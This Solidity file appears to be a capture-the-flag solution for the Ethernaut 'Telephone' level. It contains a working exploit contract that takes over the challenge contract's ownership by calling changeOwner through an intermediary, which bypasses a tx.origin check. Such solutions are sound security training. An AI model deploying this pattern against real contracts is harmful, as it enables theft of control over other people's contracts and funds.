//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITelephone {
    function owner() external view returns (address);

    function changeOwner(address _owner) external;
}

contract TelephoneExploit {
    ITelephone public implementation;
    address public owner;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Telephone` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe
    constructor(ITelephone _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    /// @notice Function `changeOwner()` needs to be called from a smart contract
    function exploit() external {
        implementation.changeOwner(msg.sender);
        require(msg.sender == owner, "not owner");
    }

    /// @notice Returns a boolean wheter the `implementation` contract challenge has been exploited
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.owner() == owner;
    }
}
